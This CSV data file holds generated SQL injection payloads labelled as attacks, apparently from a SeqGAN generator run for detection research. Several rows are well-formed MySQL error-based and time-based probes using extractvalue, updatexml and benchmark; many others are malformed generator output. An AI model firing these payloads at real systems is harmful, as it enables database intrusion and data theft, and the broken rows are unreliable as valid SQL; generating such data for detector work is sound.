label,payload,family,payload_type,method,run_id,sample_index
attack,"1%""   )    )     extractvalue  (  }1808,concat  (  (  0x2e,concat  (  =  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  5000000,md5  (  8862  (  0x2e,0x7171706a71,  (  5000000(  (  (  0x4b774c75   (  (  elt  (  elt  (  1297  =  5603  (  (  0x5c,  (  select   (  el  9788  =  (  (  1808,concat  (  =  (  0x5c,  (  (  select   (  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1236
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1237
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1238
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'e%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1239
attack,"1# AND bnal  )  /  (  =  (  (  0x2e,md5  (  (  (  select   (  elt  (  elt  (  1808  =  3393,  (  (  benchmark  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  casea   end  (  (   (  9393  (  (  elt    (  (  (  0x5c,0x7171706a71,  (  (  select   (  (  elta  elt  (  1808  =  (  (  3393  =  0x7171706a71(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1240
attack,"1%k8277""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1241
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1242
attack,"1%""   )    )     extractvalue  (  (  9627,concat  (  (  (  (  (  (  (  (  =  (  (  (  (  (  2917  (  (  0x5c,  (  0x5c,0x7171706a71,md5  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  1297  =  (  3393,1   )    (  extractvalue  (  9627,md5  =  (  (  7982  =  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1243
attack,1%%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1244
attack,"1%""   )    (  extractvalue  (  9627,md5  (  (  0x5c,0x7171706a71,  (  select   (  (  el  (  case  =  4688  (  1808,concat  (  (  (  (  0x5c,  (  (  select   (  (  e    (  case   ual adonadede   (  3681  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x4b774c75   end  (  =  (  5433  =  3393,1   )    )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1245
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1246
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1247
attack,"select   (  )  case when   (  9103  =  4774  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  6212  (  1297,1   or  extractvalue  (  (  9627  =  (  benchmark  (  3393,1   )    (  extractvalue  (  (  9255,concat  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  select   (  elt  (  2162  )  1808  =  (  (  1 as anal  )  1808  =  (  3393,1",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1248
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1249
attack,"1%1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1250
attack,",(  (  (  (  =  (  (  (  end  (  (  1808,concat  (  (  (  0x5c,(  =  (  7982,concat  (  (  (  (  1 extractvalue  (  7982,1   )    USR$whenerodea  e  case when   (  5704  (  (  0x5c,0x7171706a71,  (  select   (  (  5000000  (  (  1297,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  3393  (  0x2e,0x7171706a71,  (  =  (  3393,1   )    )  extractvalue  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1251
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%py nvgznnzly  0x4b774c75)      )    (  (  extractvalue  (  (  1049  )  (  =  (  (  (  3393,concat' like '  (  5777  (  (  7982  =  (  0x5c,0x7171706a71,1   from dua  elt  (  elt  (  3393  =  3393,1   (  (  elt  (  2917  =  (  3393,  (  (  7982  =  (  (  (  0x2e,concat  (  (  select   (  elt  (  elt  (  1808  =  1808,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1252
attack,"1%%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1253
attack,"1%""   )    )     )  extractvalue  (  (  (  (  (  (  9627,concat  (  (  (  (  3393,  (  benchmark  (  2917=  (  9627,concat  (  (  (  1 or extractvalue  (  (   from dual  )  e  =  (  1808,1   )    (  extractvalue  (  2917,md5  (  (  0x5c,  (  (  benchmark  (  (  5000000(  (  0x5c,  (  0x2e,0x7171706a71,  (  1049  (  5000000,md5  (  (  (  0x2e,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1254
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1255
attack,"1%""   )    (  extractvalue  (  8862,1extractvalue  (  (  (  (  (  (  (  (  0x2e,0x7171706a71(  (  (  0x2e,0x7171706a71,  (  (  select   (  7982  =  (  (  3393,1   from d5  (  9667  )  (  (  (  select   (  elt  (  0x4b774c75   end  (  elt  (  elt  e  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1256
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'knnA"" like """" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""WHERE1802' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1257
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1258
attack,"1%""   (  )    extractvalue  (  (  (  (  (  (  (  (  7982  (  (  (  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  =  (  9627,concat  (  (  (  =  extractvalue  (  (  benchmark  (  5000000(  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  )   (  (  elt  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1259
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1260
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1261
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1262
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  "" %'  =  'k0x717a767a71' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '1802el  (  1297  =  (  (  3393,1   )    )    (  2162  =  1  (  US,updatexml_(  (   (    (  (  eltalt  elt  (  1297  =  (  1808,1   )    AND AND when d5  (  0x2e,0x7171706a71,0x7171706a71,  (  (  5000000,md5  (  (  select   (  elt  3393  =  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  3393,1   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1263
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1264
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1265
attack,"1%   and extractvalue  (  (  (  7982,1   )    1559  US,0x717a767a71extractvalue  (  (  (  0x2e,0x7171706a71(  (  benchmark  (  (  (  (  0x5c,0x7171706a71,  (  (  (  (  (  (  1759,updatexml  (  (  (  (  (  (  (  (  =  (  (  (  50000003393  (  (  (  (  select   (   from (  5322  (  e(  ell  2917  =  (    (  (  (  e  (  (  7982,concat  (  (  (  (  0x5c,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1266
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1267
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1268
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  1808,concat  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  9255,md5  (  (  (  (  0x5c,  (  (  select   (  elt  (  (  elt  (  1808  =  (  0x5c,0x7171706a71,  (  benchmark  (   (  (  (  elt  (  1297  =  (  (  (  0x2e,0x7171706a71,  (  (  select   (  (  elt  (  1808  =  (  7982,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1269
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1270
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1271
attack,"1"" or extractvalue  (  =  (  )   (  4415  (  (  (  1297,concat  (  (  (  (  (  7982  =  (  9788(  (  9788  (  (  0x5c,0x7171706a71,  (  select   (  5433  (  case when   (  (  case when   (  4660  (  (  0x2e,0x7171706a71,  (  (  select   (  (  el  (  3393  =  (  (  (  0x2e,md5  (  select   (  elt  (  1808  =  (  (  0x2e,0x7171706a71,  (  (  t(  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1272
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1273
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1274
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1275
attack,"1"" and extractvalue  (  (  (  (  (  3393,concat  (  0x5c,0x7171706a71,  (  select   (  case d5  )  elt  (  elt  (  1808  =  (  3393,1   )    (  extractvalue  (  9627,m  (  select   (  elt  (  e  (  3393  =  (  9255,concat  (  (  (  0x2e,md5  (  (   (  (  (  0x4b774c75   (  (  (  case when   (  4415  (  (  e  (  3393,1   )    (  extractvalue  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1276
attack," AND 1 p else cast  (  extractvalue  (  (  (  (  (  3393,md5  =  (  (  0x5c,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  t  (  5000000,md5  (  benchmark  (  (  (  5000000,m(  (  select   (  elt  )  (  select   (  elt  e  (  1808  =  1   (  updatexml  (  (  (  (  7982  (  (  t  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  benchmark  (  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1277
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1278
attack,"1%updatexml  )  select   (  (  case 0 from   (  5433  (  (  eltua  elt  (  1808  =    (  (  3393  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  (  (  select  (  (  elt  0x4b774c75   end  (  (  elt  (  elt  (  3393  =  8318  (  elt  (  (  3393  (  =  (  ut  (  benchmark  (  benchmark  (  (  benchmark  (  (  5000000(  (  (  0x4b774c75   end  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1279
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1280
attack,"1%""   )    OT0x7171706a71,extractvalue0x78   ( 3863o  (2914  (  5000000,md5  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  benchmark  (  benchmark  (  5000000,md5  (  =  1759,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  =  3393,  (  (  (  5000000(  (  (  0x2e,0x7171706a71,md5  (  (  0x5c,0x7171706a71,  (  select   (  case 0 0 from(  ual  )   end  (  (  elt  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1281
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1282
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1283
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1284
attack,"1%""   )    (  =  8083  )   or extractvalue  (  (  (  3393,concat  (  (  (  (  =  (  (  3393,1   (  d 0 from dual  )  eysal  )  3539  )  )  )   end  (  (  29176528  )  (  (  0x2e,md5  (  (  0x2e,  (  benchmark  (  (  5000000,md5  (  (  0x2e,1  )  extractvalue  (  (  (  1759,concat  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1285
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1286
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1287
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1288
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1289
attack,"""   )    AND 'i'  )  x  (  and extractvalue  (  (  (  3364  (  l  (  (  0x4b774c75   (  6581  (  (  (  0x2e,md5(  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  5000000,md5  (  (  0x2e,md5  (  extractvalue  (  5000000,md5  (  0x5c,  (  benchmark  (  (  3393,concat  (  (  (  9255,md5  (  (  0x5c,  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1290
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1291
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1292
attack,"1 and extractvalue  (  (  (  3393,concat  (  (  (  1808  =  (  0x5c,0x7171706a71,0x7171706a71,  (  9788(  (  (  benchmark  (  (  (  (  9627,concat  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  eselect 0 dual  )   end  (  (lt  el  (  1297  =  (  (  1759  (  (  (  select   (  elt  6581  =  (  1808,1   from dua  el  (  8862  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1293
attack,"1%""   )    )     (  extractvalue  3393,  (  (  tl_inadd5  (  e  (  elt  (  0x2e,0x7171706a71,md5  (  (  1808  =  (  2917,concat  (  (  (  (  (  0x2e,  (  select   (  elt  (  elt  (  e0x7171706a71    (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  2518  =  3393,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1294
attack,1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1295
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1296
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1297
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1298
attack,"1%""   )    (  extractvalue  (  (  (  1808,concat  (  (  (  (  (  (  =  (  (  (  (  (  (  (  (  (  (  (  17590x7171706a71,m(  (  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  (  1808  =  (  (  0x2e,0x7171706a71,  (  select   (  el  (  3393  =  extractvalue  (  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  7982  =  (  benchmark  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1299
attack,"1 where *,8666  U extractvalue  (  3393,concat  (  0  (  0x5c,0x7171706a71benchmark  (  5000000(  =  (  ut  elt  (  1297  =  (  (  select   (  elt  (  1812  =  2768  (  (  0x5c,  (  (  5000000(  (  select   (  e  (  elt     (  1297  =  (  3393,md5  (  9788,md5  =  (  3393,md5  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  5433  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1300
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1301
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1302
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1303
attack,"1%""   )    )    AND 'i'  =  extractvalue  (  (  (  (  (  (  2917,concat  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  0x5c,0x7171706a71,  (  (  (  (  (  t  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  (  (  9627,concat  (  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  50000000x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1304
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpn"" like ""kpw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1305
